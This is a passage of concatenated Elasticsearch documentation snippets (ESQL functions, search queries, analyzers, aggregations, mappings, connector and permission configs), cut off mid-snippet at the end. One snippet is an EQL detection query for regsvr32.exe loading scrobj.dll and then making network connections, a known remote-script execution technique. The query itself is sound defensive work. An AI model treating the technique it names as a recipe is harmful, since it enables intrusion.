DESCRIPTION: Demonstrates how to use the MV_SLICE function to extract portions of a multivalued field. The example shows both single-parameter usage (start index only) and two-parameter usage (start and end index) on an array of numbers.

LANGUAGE: sql
CODE:
row a = [1, 2, 2, 3]
| eval a1 = mv_slice(a, 1), a2 = mv_slice(a, 2, 3)

----------------------------------------

TITLE: Analyzing Text with Keep Types Filter (Exclude Mode) in Elasticsearch
DESCRIPTION: This example uses the Analyze API to demonstrate the Keep Types filter removing numeric tokens from the input text.

LANGUAGE: console
CODE:
GET _analyze
{
  "tokenizer": "standard",
  "filter": [
    {
      "type": "keep_types",
      "types": [ "<NUM>" ],
      "mode": "exclude"
    }
  ],
  "text": "1 quick fox 2 lazy dogs"
}

----------------------------------------

TITLE: Querying and Filtering Books using ESQL in Elasticsearch
DESCRIPTION: This ESQL query filters books by author 'Faulkner', selects specific columns, sorts by book number, and limits the results to 5 entries. It demonstrates the use of KQL for filtering, KEEP for column selection, SORT for ordering, and LIMIT for restricting the result set.

LANGUAGE: esql
CODE:
FROM books
| WHERE KQL("author: Faulkner")
| KEEP book_no, author
| SORT book_no
| LIMIT 5

----------------------------------------

TITLE: Computing SHA256 Hashes with ESQL
DESCRIPTION: An ESQL query that filters out 'Connection error' messages, computes SHA256 hashes of the message field, and returns both the original message and its hash. The query demonstrates the use of WHERE, EVAL, and KEEP clauses.

LANGUAGE: esql
CODE:
FROM sample_data
| WHERE message != "Connection error"
| EVAL sha256 = sha256(message)
| KEEP message, sha256

----------------------------------------

TITLE: Calculating Microsecond Difference with DATE_DIFF in ESQL
DESCRIPTION: Demonstrates how to calculate the difference between two timestamps in microseconds using DATE_DIFF function. Shows a 1-millisecond difference resulting in 1000 microseconds.

LANGUAGE: esql
CODE:
ROW date1 = TO_DATETIME("2023-12-02T11:00:00.000Z"), date2 = TO_DATETIME("2023-12-02T11:00:00.001Z")
| EVAL dd_ms = DATE_DIFF("microseconds", date1, date2)

----------------------------------------

TITLE: Setting Up Complex Index and Application Permissions in Elasticsearch
DESCRIPTION: This role descriptor defines various index permissions, including manage_ilm and all privileges, along with application-specific privileges for 'maps'. It also includes run-as capabilities.

LANGUAGE: json
CODE:
{"cluster":[],"indices":[{"names":["na\"me","*"],"privileges":["manage_ilm"],"field_security":{"grant":null,"except":["denied*"]},"query":"{\"match\": {\"category\": \"click\"}}"},{"names":["/@&~(\\.security.*)/"],"privileges":["all","cluster:a_wrong_*_one"]}],"applications":[{"application":"maps","privileges":["coming","up","with","random","names","is","hard"],"resources":["raster:*"]}],"run_as":["impersonated????"]}

----------------------------------------

TITLE: Executing Wildcard Query in Elasticsearch
DESCRIPTION: Example of a wildcard query that searches for documents where the user.id field contains terms starting with 'ki' and ending with 'y'. The query includes boost and rewrite parameters for relevance score adjustment and query rewriting.

LANGUAGE: console
CODE:
GET /_search
{
  "query": {
    "wildcard": {
      "user.id": {
        "value": "ki*y",
        "boost": 1.0,
        "rewrite": "constant_score_blended"
      }
    }
  }
}

----------------------------------------

TITLE: SQL CASE with Switch Syntax
DESCRIPTION: Alternative syntax for CASE that mimics switch-case statements from other programming languages. Compares an expression against multiple values to determine the result.

LANGUAGE: sql
CODE:
CASE expression
     WHEN value1 THEN result1
    [WHEN value2 THEN result2]
    [WHEN ...]
    [ELSE default_result]
END

----------------------------------------

TITLE: Basic Span Term Query in Elasticsearch
DESCRIPTION: Simple example of a span_term query that matches documents where user.id equals 'kimchy'.

LANGUAGE: console
CODE:
GET /_search
{
  "query": {
    "span_term" : { "user.id" : "kimchy" }
  }
}

----------------------------------------

TITLE: Indexing Document with Dynamic Fields in Elasticsearch
DESCRIPTION: This snippet demonstrates indexing a document that adds new fields dynamically, including nested objects. It also shows how to retrieve the updated mapping.

LANGUAGE: console
CODE:
PUT my-index-000001/_doc/1
{
  "username": "johnsmith",
  "name": {
    "first": "John",
    "last": "Smith"
  }
}

GET my-index-000001/_mapping

----------------------------------------

TITLE: Calculating Microsecond Difference with DATE_DIFF in ESQL
DESCRIPTION: Demonstrates how to calculate the difference between two timestamps in microseconds using DATE_DIFF function. Shows a 1-millisecond difference resulting in 1000 microseconds.

LANGUAGE: esql
CODE:
ROW date1 = TO_DATETIME("2023-12-02T11:00:00.000Z"), date2 = TO_DATETIME("2023-12-02T11:00:00.001Z")
| EVAL dd_ms = DATE_DIFF("microseconds", date1, date2)

----------------------------------------

TITLE: Configuring and Querying null_value in Elasticsearch
DESCRIPTION: This snippet demonstrates how to configure the null_value parameter in an Elasticsearch index mapping, insert documents with null values, and query for the null_value. It shows the difference in behavior between explicit null values and empty arrays.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "mappings": {
    "properties": {
      "status_code": {
        "type":       "keyword",
        "null_value": "NULL"
      }
    }
  }
}

PUT my-index-000001/_doc/1
{
  "status_code": null
}

PUT my-index-000001/_doc/2
{
  "status_code": []
}

GET my-index-000001/_search
{
  "query": {
    "term": {
      "status_code": "NULL"
    }
  }
}

----------------------------------------

TITLE: Configuring GitHub Connector in YAML
DESCRIPTION: Example YAML configuration for the GitHub connector when running against a Dockerized version of Elasticsearch and Kibana. This snippet shows how to set up the connector with Elasticsearch connection details and API key.

LANGUAGE: yaml
CODE:
elasticsearch.host: http://host.docker.internal:9200
elasticsearch.api_key: <ELASTICSEARCH_API_KEY>

connectors:
  -
    connector_id: <CONNECTOR_ID_FROM_KIBANA>
    service_type: github
    api_key: <CONNECTOR_API_KEY_FROM_KIBANA> # Optional. If not provided, the connector will use the elasticsearch.api_key instead

----------------------------------------

TITLE: Applying FLOOR Function in ESQL
DESCRIPTION: This snippet demonstrates the use of the FLOOR function in ESQL. It creates a row with a floating-point value and then applies the FLOOR function to round it down to the nearest integer.

LANGUAGE: esql
CODE:
ROW a=1.8
| EVAL a=FLOOR(a)

----------------------------------------

TITLE: Reversing Text String with ESQL REVERSE Function
DESCRIPTION: Demonstrates the basic usage of REVERSE function to reverse a text string. Uses ROW to create a sample record and EVAL to create a new field with the reversed content.

LANGUAGE: esql
CODE:
ROW message = "Some Text" | EVAL message_reversed = REVERSE(message);

----------------------------------------

TITLE: Basic Geo-centroid Aggregation on Museums
DESCRIPTION: This snippet shows a basic geo-centroid aggregation on the museums index, computing the centroid of all museum locations.

LANGUAGE: console
CODE:
POST /museums/_search?size=0
{
  "aggs": {
    "centroid": {
      "geo_centroid": {
        "field": "location"
      }
    }
  }
}

----------------------------------------

TITLE: Manipulating Metadata Fields with Script Processor in Elasticsearch
DESCRIPTION: Example showing how to modify document metadata (_index) using a Painless script in an ingest pipeline. The script combines a document's lang field with a parameter to create a new index name.

LANGUAGE: console
CODE:
POST _ingest/pipeline/_simulate
{
  "pipeline": {
    "processors": [
      {
        "script": {
          "description": "Set index based on `lang` field and `dataset` param",
          "lang": "painless",
          "source": """
            ctx['_index'] = ctx['lang'] + '-' + params['dataset'];
          """,
          "params": {
            "dataset": "catalog"
          }
        }
      }
    ]
  },
  "docs": [
    {
      "_index": "generic-index",
      "_source": {
        "lang": "fr"
      }
    }
  ]
}

----------------------------------------

TITLE: Zero Terms Query with Match All
DESCRIPTION: Match query handling empty token scenarios using zero_terms_query parameter

LANGUAGE: console
CODE:
GET /_search
{
  "query": {
    "match": {
      "message": {
        "query": "to be or not to be",
        "operator": "and",
        "zero_terms_query": "all"
      }
    }
  }
}

----------------------------------------

TITLE: Executing Span Within Query in Elasticsearch
DESCRIPTION: This snippet demonstrates how to use the span_within query in Elasticsearch. It searches for spans from a 'little' clause (span_term) that are enclosed within a 'big' clause (span_near). The query uses field1 for matching terms 'foo', 'bar', and 'baz'.

LANGUAGE: console
CODE:
GET /_search
{
  "query": {
    "span_within": {
      "little": {
        "span_term": { "field1": "foo" }
      },
      "big": {
        "span_near": {
          "clauses": [
            { "span_term": { "field1": "bar" } },
            { "span_term": { "field1": "baz" } }
          ],
          "slop": 5,
          "in_order": true
        }
      }
    }
  }
}

----------------------------------------

TITLE: Assigning Site Permissions with Graph API
DESCRIPTION: HTTP POST request to assign read or write access to a specific SharePoint site using Microsoft Graph API.

LANGUAGE: http
CODE:
POST https://graph.microsoft.com/v1.0/sites/<siteId>/permissions
{
    "roles": ["read"], // or "write"
    "grantedToIdentities": [
        {
            "application": {
                "id": "<App_Client_ID>",
                "displayName": "<App_Display_Name>"
            }
        }
    ]
}

----------------------------------------

TITLE: Indexing Child Documents with Join Field in Elasticsearch
DESCRIPTION: This snippet shows how to index child documents using the join field. It demonstrates the required routing and specifying the parent-child relationship.

LANGUAGE: console
CODE:
PUT my-index-000001/_doc/3?routing=1&refresh
{
  "my_id": "3",
  "text": "This is an answer",
  "my_join_field": {
    "name": "answer",
    "parent": "1"
  }
}

PUT my-index-000001/_doc/4?routing=1&refresh
{
  "my_id": "4",
  "text": "This is another answer",
  "my_join_field": {
    "name": "answer",
    "parent": "1"
  }
}

----------------------------------------

TITLE: Verifying Index Version in Elasticsearch
DESCRIPTION: GET request to check the version of a specific index after reindexing.

LANGUAGE: console
CODE:
GET .migrated-ds-my-data-stream-2025.01.23-000001?human&filter_path=*.settings.index.version.created_string

----------------------------------------

TITLE: Generating X.509 Certificates and Private Keys
DESCRIPTION: This example shows how to generate X.509 certificates and private keys using a previously created CA certificate.

LANGUAGE: shell
CODE:
bin/elasticsearch-certutil cert --ca elastic-stack-ca.p12

----------------------------------------

TITLE: Parsing Missing Aggregation Response in Elasticsearch
DESCRIPTION: This snippet shows the expected response format for a Missing aggregation query. The response includes an 'aggregations' object with a 'products_without_a_price' sub-object containing the 'doc_count' of documents missing the specified field.

LANGUAGE: console-result
CODE:
{
  ...
  "aggregations": {
    "products_without_a_price": {
      "doc_count": 0
    }
  }
}

----------------------------------------

TITLE: Accessing Geopoint Values in Elasticsearch Scripts
DESCRIPTION: This snippet shows how to access the latitude and longitude values of a geopoint field in Elasticsearch scripts, including a performance optimization tip.

LANGUAGE: painless
CODE:
def geopoint = doc['location'].value;
def lat      = geopoint.lat;
def lon      = geopoint.lon;

LANGUAGE: painless
CODE:
def lat      = doc['location'].lat;
def lon      = doc['location'].lon;

----------------------------------------

TITLE: Using MV_COUNT Function in Elasticsearch ESQL
DESCRIPTION: Demonstrates how to use the MV_COUNT function to count the number of values in a multivalued array column. The example shows counting values in array 'a' containing three string elements.

LANGUAGE: sql
CODE:
ROW a=["foo", "zoo", "bar"]
| EVAL count_a = MV_COUNT(a)

----------------------------------------

TITLE: Using MIN Aggregation in ESQL
DESCRIPTION: Demonstrates how to use the MIN function to find the minimum value of the 'languages' field in the 'employees' table using ESQL. The MIN function performs an aggregation operation that returns the smallest value from all rows in the specified column.

LANGUAGE: sql
CODE:
FROM employees
| STATS MIN(languages)

----------------------------------------

TITLE: Converting Numeric to String with TO_STRING in ESQL
DESCRIPTION: This snippet demonstrates the usage of the TO_STRING function in ESQL to convert a numeric value to a string. It creates a row with a numeric value and then uses TO_STRING to convert it to a string in a new column.

LANGUAGE: sql
CODE:
ROW a=10
| EVAL j = TO_STRING(a)

----------------------------------------

TITLE: Executing a Regexp Query in Elasticsearch
DESCRIPTION: This snippet demonstrates how to use the Regexp query to search for documents where the user.id field matches a specific pattern. It includes various optional parameters to customize the query behavior.

LANGUAGE: console
CODE:
GET /_search
{
  "query": {
    "regexp": {
      "user.id": {
        "value": "k.*y",
        "flags": "ALL",
        "case_insensitive": true,
        "max_determinized_states": 10000,
        "rewrite": "constant_score_blended"
      }
    }
  }
}

----------------------------------------

TITLE: Customizing Standard Deviation Bounds in Elasticsearch Extended Stats Aggregation
DESCRIPTION: This example shows how to adjust the sigma value for standard deviation bounds in the extended_stats aggregation. It allows for customization of the interval around the mean.

LANGUAGE: console
CODE:
GET /exams/_search
{
  "size": 0,
  "aggs": {
    "grades_stats": {
      "extended_stats": {
        "field": "grade",
        "sigma": 3
      }
    }
  }
}

----------------------------------------

TITLE: Creating Custom Analyzer with Pattern Replace Filter in Elasticsearch
DESCRIPTION: Example of creating a custom analyzer with a pattern_replace filter that removes currency symbols (£ and €) from text. The filter is configured to only replace the first occurrence in each token.

LANGUAGE: console
CODE:
PUT /my-index-000001
{
  "settings": {
    "analysis": {
      "analyzer": {
        "my_analyzer": {
          "tokenizer": "keyword",
          "filter": [
            "my_pattern_replace_filter"
          ]
        }
      },
      "filter": {
        "my_pattern_replace_filter": {
          "type": "pattern_replace",
          "pattern": "[£|€]",
          "replacement": "",
          "all": false
        }
      }
    }
  }
}

----------------------------------------

TITLE: Cartesian Bounds Aggregation on Shape Fields in Elasticsearch
DESCRIPTION: This snippet shows how to use the cartesian-bounds aggregation with Shape fields. It includes creating an index with a Shape field, inserting sample data with both Point and Polygon geometries, and performing the aggregation.

LANGUAGE: console
CODE:
PUT /places
{
  "mappings": {
    "properties": {
      "geometry": {
        "type": "shape"
      }
    }
  }
}

POST /places/_bulk?refresh
{"index":{"_id":1}}
{"name": "NEMO Science Museum", "geometry": "POINT(491.2350 5237.4081)" }
{"index":{"_id":2}}
{"name": "Sportpark De Weeren", "geometry": { "type": "Polygon", "coordinates": [ [ [ 496.5305328369141, 5239.347642069457 ], [ 496.6979026794433, 5239.1721758934835 ], [ 496.9425201416015, 5239.238958618537 ], [ 496.7944622039794, 5239.420969150824 ], [ 496.5305328369141, 5239.347642069457 ] ] ] } }

POST /places/_search?size=0
{
  "aggs": {
    "viewport": {
      "cartesian_bounds": {
        "field": "geometry"
      }
    }
  }
}

----------------------------------------

TITLE: Using TERM Function in ESQL Query
DESCRIPTION: Demonstrates how to use the TERM function to perform exact term matching on the 'author' field, filtering books where the author matches 'gabriel'. The query returns the book_no and title fields for up to 3 matching records.

LANGUAGE: sql
CODE:
FROM books
| WHERE TERM(author, "gabriel")
| KEEP book_no, title
| LIMIT 3

----------------------------------------

TITLE: Defining Field Write Operations for Elasticsearch Update Scripts in Java
DESCRIPTION: This snippet specifies the allowed field write operations in Elasticsearch update scripts. It includes methods for manipulating field values, such as moving, overwriting, removing, and transforming data.

LANGUAGE: java
CODE:
class org.elasticsearch.script.field.WriteField {
    String getName()
    boolean exists()
    WriteField move(def)
    WriteField overwrite(def)
    void remove()
    WriteField set(def)
    WriteField append(def)
    boolean isEmpty()
    int size()
    Iterator iterator()
    def get(def)
    def get(int, def)
    boolean hasValue(Predicate)
    WriteField transform(Function)
    WriteField deduplicate()
    WriteField removeValuesIf(Predicate)
    WriteField removeValue(int)
    NestedDocument doc()
    NestedDocument doc(int)
    Iterable docs()
}

----------------------------------------

TITLE: Analyzing Text with Keyword Tokenizer
DESCRIPTION: Example of using the analyze API with keyword tokenizer to demonstrate token generation with whitespace before applying trim filter.

LANGUAGE: console
CODE:
GET _analyze
{
  "tokenizer" : "keyword",
  "text" : " fox "
}

----------------------------------------

TITLE: Including ST_X Function Documentation Sections in Markdown
DESCRIPTION: This snippet demonstrates how to include various sections of the ST_X function documentation using Markdown include directives.

LANGUAGE: markdown
CODE:
:::{include} ../parameters/st_x.md
:::

:::{include} ../description/st_x.md
:::

:::{include} ../types/st_x.md
:::

:::{include} ../examples/st_x.md
:::

----------------------------------------

TITLE: Creating SharePoint OAuth App XML Permission Request
DESCRIPTION: XML string to request full control and read permissions for the SharePoint OAuth app.

LANGUAGE: xml
CODE:
<AppPermissionRequests AllowAppOnlyPolicy="true">
<AppPermissionRequest Scope="http://sharepoint/content/tenant" Right="FullControl" />
<AppPermissionRequest Scope="http://sharepoint/social/tenant" Right="Read" />
</AppPermissionRequests>

----------------------------------------

TITLE: Using ATAN Function in ESQL
DESCRIPTION: Demonstrates how to use the ATAN function to calculate the arctangent of a numeric value. Takes a numeric input and returns the angle in radians.

LANGUAGE: sql
CODE:
ROW a=12.9
| EVAL atan=ATAN(a)

----------------------------------------

TITLE: Decoding Base64 String using from_base64() in ESQL
DESCRIPTION: Example showing how to decode a base64 encoded string using the from_base64() function. The function takes a base64 encoded string as input and returns the decoded value.

LANGUAGE: esql
CODE:
row a = "ZWxhc3RpYw=="
| eval d = from_base64(a)

----------------------------------------

TITLE: Creating Custom Analyzer with Uppercase Filter in Elasticsearch
DESCRIPTION: This example shows how to use the create index API to configure a new custom analyzer that incorporates the uppercase filter with a whitespace tokenizer.

LANGUAGE: console
CODE:
PUT uppercase_example
{
  "settings": {
    "analysis": {
      "analyzer": {
        "whitespace_uppercase": {
          "tokenizer": "whitespace",
          "filter": [ "uppercase" ]
        }
      }
    }
  }
}

----------------------------------------

TITLE: Sequence Analysis for Attack Detection
DESCRIPTION: EQL sequence query to detect the complete attack pattern including process creation, library load, and network activity.

LANGUAGE: console
CODE:
GET /my-data-stream/_eql/search
{
  "query": """
    sequence by process.pid
      [process where process.name == "regsvr32.exe"]
      [library where dll.name == "scrobj.dll"]
      [network where true]
  """
}

----------------------------------------

TITLE: Converting String to Datetime using TO_DATETIME in ESQL
DESCRIPTION: Demonstrates converting an array of date strings to datetime format. Shows handling of invalid date formats and resulting null values with warning headers.

LANGUAGE: esql
CODE:
ROW string = ["1953-09-02T00:00:00.000Z", "1964-06-02T00:00:00.000Z", "1964-06-02 00:00:00"]
| EVAL datetime = TO_DATETIME(string)

----------------------------------------

TITLE: Boolean Field Aggregations and Runtime Mappings
DESCRIPTION: Demonstrates how to use boolean fields in aggregations and runtime mappings, showing how boolean values are represented in terms aggregations and scripts.

LANGUAGE: console
CODE:
POST my-index-000001/_doc/1?refresh
{
  "is_published": true
}

POST my-index-000001/_doc/2?refresh
{
  "is_published": false
}

GET my-index-000001/_search
{
  "aggs": {
    "publish_state": {
      "terms": {
        "field": "is_published"
      }
    }
  },
  "sort": [ "is_published" ],
  "fields": [
    {"field": "weight"}
  ],
  "runtime_mappings": {
    "weight": {
      "type": "long",
      "script": "emit(doc['is_published'].value ? 10 : 0)"
    }
  }
}

----------------------------------------

TITLE: Calculating Median and 50th Percentile of Salary in ESQL
DESCRIPTION: This snippet shows how to use the MEDIAN and PERCENTILE functions to calculate the median salary and 50th percentile of salary from the employees table.

LANGUAGE: esql
CODE:
FROM employees
| STATS MEDIAN(salary), PERCENTILE(salary, 50)

----------------------------------------

TITLE: Slicing Multi-Value Fields with Negative Indices in ESQL
DESCRIPTION: This example shows how to use mv_slice function with negative indices to extract portions of a multi-value field from the end. It demonstrates extracting a single element and a range of elements using negative indexing.

LANGUAGE: esql
CODE:
row a = [1, 2, 2, 3]
| eval a1 = mv_slice(a, -2), a2 = mv_slice(a, -3, -1)

----------------------------------------

TITLE: Runtime Field Weighted Average in Elasticsearch
DESCRIPTION: Illustrates using runtime fields for weighted average calculations when values need custom processing. The example shows how to combine multiple weights using a runtime field.

LANGUAGE: console
CODE:
POST /exams/_doc?refresh
{
  "grade": 100,
  "weight": [2, 3]
}
POST /exams/_doc?refresh
{
  "grade": 80,
  "weight": 3
}

POST /exams/_search?filter_path=aggregations
{
  "size": 0,
  "runtime_mappings": {
    "weight.combined": {
      "type": "double",
      "script": """
        double s = 0;
        for (double w : doc['weight']) {
          s += w;
        }
        emit(s);
      """
    }
  },
  "aggs": {
    "weighted_grade": {
      "weighted_avg": {
        "value": {
          "script": "doc.grade.value + 1"
        },
        "weight": {
          "field": "weight.combined"
        }
      }
    }
  }
}

----------------------------------------

TITLE: Querying Geo Shapes with Geo-distance in Elasticsearch
DESCRIPTION: Shows how to use a geo_distance filter to match geo_shape values within a specified distance of a geopoint.

LANGUAGE: console
CODE:
GET my_geoshapes/_search
{
  "query": {
    "bool": {
      "must": {
        "match_all": {}
      },
      "filter": {
        "geo_distance": {
          "distance": "200km",
          "pin.location": {
            "lat": 40,
            "lon": -70
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Creating Custom Analyzer with Truncate Filter
DESCRIPTION: Example of using the create index API to configure a new custom analyzer that incorporates the truncate filter with default settings. Uses the standard tokenizer.

LANGUAGE: console
CODE:
PUT custom_truncate_example
{
  "settings" : {
    "analysis" : {
      "analyzer" : {
        "standard_truncate" : {
        "tokenizer" : "standard",
        "filter" : ["truncate"]
        }
      }
    }
  }
}

----------------------------------------

TITLE: Converting String to Lowercase using TO_LOWER in ESQL
DESCRIPTION: Demonstrates how to use the TO_LOWER function to convert a string field value to lowercase. The function takes a string input and returns a new string with all characters converted to lowercase.

LANGUAGE: sql
CODE:
ROW message = "Some Text"
| EVAL message_lower = TO_LOWER(message)

----------------------------------------

TITLE: Analyzing Text with Unique Token Filter in Elasticsearch
DESCRIPTION: This example demonstrates how to use the analyze API with the unique filter to remove duplicate tokens from a given text.

LANGUAGE: console
CODE:
GET _analyze
{
  "tokenizer" : "whitespace",
  "filter" : ["unique"],
  "text" : "the quick fox jumps the lazy fox"
}

----------------------------------------

TITLE: Converting Single String to Lowercase in ESQL
DESCRIPTION: Example showing how to convert a single string field to lowercase using the TO_LOWER function. Creates a new field 'message_lower' containing the lowercase version of the 'message' field.

LANGUAGE: esql
CODE:
ROW message = "Some Text"
| EVAL message_lower = TO_LOWER(message)

----------------------------------------

TITLE: Configuring Index Buffer Size Settings in Elasticsearch
DESCRIPTION: Static configuration parameters for controlling the indexing buffer size in Elasticsearch nodes. Includes settings for the main buffer size (as percentage or bytes), minimum buffer size, and maximum buffer size limits.

LANGUAGE: yaml
CODE:
indices.memory.index_buffer_size: "10%"     # Default value, percentage of total heap
indices.memory.min_index_buffer_size: "48mb"  # Default minimum size
indices.memory.max_index_buffer_size: null     # Default is unbounded

----------------------------------------

TITLE: Custom Keyword Analyzer Configuration in Elasticsearch
DESCRIPTION: Example of creating a custom analyzer based on the keyword analyzer with the ability to add custom token filters. This configuration shows the basic setup for a customized keyword analyzer.

LANGUAGE: console
CODE:
PUT /keyword_example
{
  "settings": {
    "analysis": {
      "analyzer": {
        "rebuilt_keyword": {
          "tokenizer": "keyword",
          "filter": [
          ]
        }
      }
    }
  }
}

----------------------------------------

TITLE: Searching and Highlighting with Term Vectors
DESCRIPTION: This snippet demonstrates a search query that matches terms in the 'text' field and requests highlighting. The fast vector highlighter will be used automatically due to the term vector configuration.

LANGUAGE: console
CODE:
GET my-index-000001/_search
{
  "query": {
    "match": {
      "text": "brown fox"
    }
  },
  "highlight": {
    "fields": {
      "text": {} <1>
    }
  }
}

----------------------------------------

TITLE: Searching with Query Rules using Rule Retriever
DESCRIPTION: Example demonstrating how to search using a defined query ruleset with the rule retriever to apply custom result ordering.

LANGUAGE: console
CODE:
GET /my-index-000001/_search
{
  "retriever": {
    "rule": {
      "retriever": {
        "standard": {
          "query": {
            "query_string": {
              "query": "puggles"
            }
          }
        }
      },
      "match_criteria": {
        "query_string": "puggles",
        "user_country": "us"
      },
      "ruleset_ids": [ "my-ruleset" ]
    }
  }
}

----------------------------------------

TITLE: Querying Employee Last Names with ENDS_WITH Function in ESQL
DESCRIPTION: This ESQL query selects the last_name field from the employees table, then evaluates whether each last name ends with the letter 'd'. The result is stored in a new boolean field called ln_E.

LANGUAGE: esql
CODE:
FROM employees
| KEEP last_name
| EVAL ln_E = ENDS_WITH(last_name, "d")

----------------------------------------

TITLE: Using MV_FIRST with SPLIT Function in ESQL
DESCRIPTION: Example showing how to use MV_FIRST to extract the first value from a delimited string after splitting it. The SPLIT function creates a multivalued column which is then processed by MV_FIRST to return only the first element.

LANGUAGE: sql
CODE:
ROW a="foo;bar;baz"
| EVAL first_a = MV_FIRST(SPLIT(a, ";"))

----------------------------------------

TITLE: ESQL Date Part Extraction Comment
DESCRIPTION: Generated comment indicating this is auto-generated ESQL test case documentation for date extraction functions. Warns against manual edits.

LANGUAGE: text
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

----------------------------------------

TITLE: ESQL Data Type Mappings Table in Markdown
DESCRIPTION: A markdown table showing the mapping between field types and their corresponding result types in ESQL functions. The table includes basic data types like boolean, date, numeric types, and string types.

LANGUAGE: markdown
CODE:
| field | result |
| --- | --- |
| boolean | boolean |
| date | date |
| date_nanos | date_nanos |
| double | double |
| integer | integer |
| ip | ip |
| keyword | keyword |
| long | long |
| text | keyword |
| version | version |

----------------------------------------

TITLE: Configuring Synonym Graph Filter with Synonyms Set in Elasticsearch
DESCRIPTION: JSON configuration for a synonym_graph filter using a pre-defined synonyms set. The updateable option allows reloading of search analyzers to pick up changes to synonym files.

LANGUAGE: json
CODE:
{
  "filter": {
    "synonyms_filter": {
      "type": "synonym_graph",
      "synonyms_set": "my-synonym-set",
      "updateable": true
    }
  }
}

----------------------------------------

TITLE: Configuring Cluster Logging Levels
DESCRIPTION: Example of dynamically updating logging levels for specific Elasticsearch modules using the Cluster Settings API.

LANGUAGE: console
CODE:
PUT /_cluster/settings
{
  "persistent": {
    "logger.org.elasticsearch.indices.recovery": "DEBUG"
  }
}

----------------------------------------

TITLE: Full RRF Example with Index Creation and Search
DESCRIPTION: Complete example showing index creation, document indexing, and an RRF search query with aggregations.

LANGUAGE: console
CODE:
PUT example-index
{
    "mappings": {
        "properties": {
            "text" : {
                "type" : "text"
            },
            "vector": {
                "type": "dense_vector",
                "dims": 1,
                "index": true,
                "similarity": "l2_norm",
                 "index_options": {
                     "type": "hnsw"
                 }
            },
            "integer" : {
                "type" : "integer"
            }
        }
    }
}

PUT example-index/_doc/1
{
    "text" : "rrf",
    "vector" : [5],
    "integer": 1
}

PUT example-index/_doc/2
{
    "text" : "rrf rrf",
    "vector" : [4],
    "integer": 2
}

PUT example-index/_doc/3
{
    "text" : "rrf rrf rrf",
    "vector" : [3],
    "integer": 1
}

PUT example-index/_doc/4
{
    "text" : "rrf rrf rrf rrf",
    "integer": 2
}

PUT example-index/_doc/5
{
    "vector" : [0],
    "integer": 1
}

POST example-index/_refresh

GET example-index/_search
{
    "retriever": {
        "rrf": {
            "retrievers": [
                {
                    "standard": {
                        "query": {
                            "term": {
                                "text": "rrf"
                            }
                        }
                    }
                },
                {
                    "knn": {
                        "field": "vector",
                        "query_vector": [3],
                        "k": 5,
                        "num_candidates": 5
                    }
                }
            ],
            "rank_window_size": 5,
            "rank_constant": 1
        }
    },
    "size": 3,
    "aggs": {
        "int_count": {
            "terms": {
                "field": "integer"
            }
        }
    }
}

----------------------------------------

TITLE: Using DATE_DIFF Function in ESQL
DESCRIPTION: Demonstrates how to calculate the time difference between two timestamps using the DATE_DIFF function. The example shows calculating microsecond differences between two datetime values that are 1 millisecond apart.

LANGUAGE: sql
CODE:
ROW date1 = TO_DATETIME("2023-12-02T11:00:00.000Z"), date2 = TO_DATETIME("2023-12-02T11:00:00.001Z")
| EVAL dd_ms = DATE_DIFF("microseconds", date1, date2)

----------------------------------------

TITLE: DISSECT String Parsing Example
DESCRIPTION: Example of parsing a timestamp, text, and IP address using DISSECT command

LANGUAGE: esql
CODE:
ROW a = "2023-01-23T12:15:00.000Z - some text - 127.0.0.1"
| DISSECT a """%{date} - %{msg} - %{ip}"""
| KEEP date, msg, ip

----------------------------------------

TITLE: Calculate Percentile Values Using MV_PERCENTILE in ESQL
DESCRIPTION: Demonstrates how to use MV_PERCENTILE function to calculate the 50th percentile (median) of a multi-valued field. The example shows both MV_PERCENTILE and MV_MEDIAN functions applied to an array of numeric values.

LANGUAGE: sql
CODE:
ROW values = [5, 5, 10, 12, 5000]
| EVAL p50 = MV_PERCENTILE(values, 50), median = MV_MEDIAN(values)

----------------------------------------

TITLE: Using Various Date/Time Extraction Functions
DESCRIPTION: Examples of using various functions to extract specific parts of dates and times.

LANGUAGE: sql
CODE:
SELECT DAY_OF_MONTH(CAST('2018-02-19T10:23:27Z' AS TIMESTAMP)) AS day;

LANGUAGE: sql
CODE:
SELECT DAY_OF_WEEK(CAST('2018-02-19T10:23:27Z' AS TIMESTAMP)) AS day;

LANGUAGE: sql
CODE:
SELECT DAY_OF_YEAR(CAST('2018-02-19T10:23:27Z' AS TIMESTAMP)) AS day;

LANGUAGE: sql
CODE:
SELECT DAY_NAME(CAST('2018-02-19T10:23:27Z' AS TIMESTAMP)) AS day;

LANGUAGE: sql
CODE:
SELECT HOUR_OF_DAY(CAST('2018-02-19T10:23:27Z' AS TIMESTAMP)) AS hour;

LANGUAGE: sql
CODE:
SELECT ISO_DAY_OF_WEEK(CAST('2018-02-19T10:23:27Z' AS TIMESTAMP)) AS day;

LANGUAGE: sql
CODE:
SELECT ISO_WEEK_OF_YEAR(CAST('2018-02-19T10:23:27Z' AS TIMESTAMP)) AS week;

LANGUAGE: sql
CODE:
SELECT MINUTE_OF_DAY(CAST('2018-02-19T10:23:27Z' AS TIMESTAMP)) AS minute;

LANGUAGE: sql
CODE:
SELECT MINUTE_OF_HOUR(CAST('2018-02-19T10:23:27Z' AS TIMESTAMP)) AS minute;

LANGUAGE: sql
CODE:
SELECT MONTH_OF_YEAR(CAST('2018-02-19T10:23:27Z' AS TIMESTAMP)) AS month;

LANGUAGE: sql
CODE:
SELECT MONTH_NAME(CAST('2018-02-19T10:23:27Z' AS TIMESTAMP)) AS month;

LANGUAGE: sql
CODE:
SELECT NOW() AS result;

LANGUAGE: sql
CODE:
SELECT SECOND_OF_MINUTE(CAST('2018-02-19T10:23:27Z' AS TIMESTAMP)) AS second;

LANGUAGE: sql
CODE:
SELECT QUARTER(CAST('2018-02-19T10:23:27Z' AS TIMESTAMP)) AS quarter;

LANGUAGE: sql
CODE:
SELECT TODAY() AS result;

LANGUAGE: sql
CODE:
SELECT WEEK(CAST('1988-01-05T09:22:10Z' AS TIMESTAMP)) AS week, ISOWEEK(CAST('1988-01-05T09:22:10Z' AS TIMESTAMP)) AS isoweek;

LANGUAGE: sql
CODE:
SELECT YEAR(CAST('2018-02-19T10:23:27Z' AS TIMESTAMP)) AS year;

----------------------------------------

TITLE: Creating and Querying Geo-bounds Aggregation for Museums
DESCRIPTION: Example showing how to create an index with geo_point mapping, insert museum location data, and perform a geo-bounds aggregation to find the bounding box for museums with names matching 'musée'.

LANGUAGE: console
CODE:
PUT /museums
{
  "mappings": {
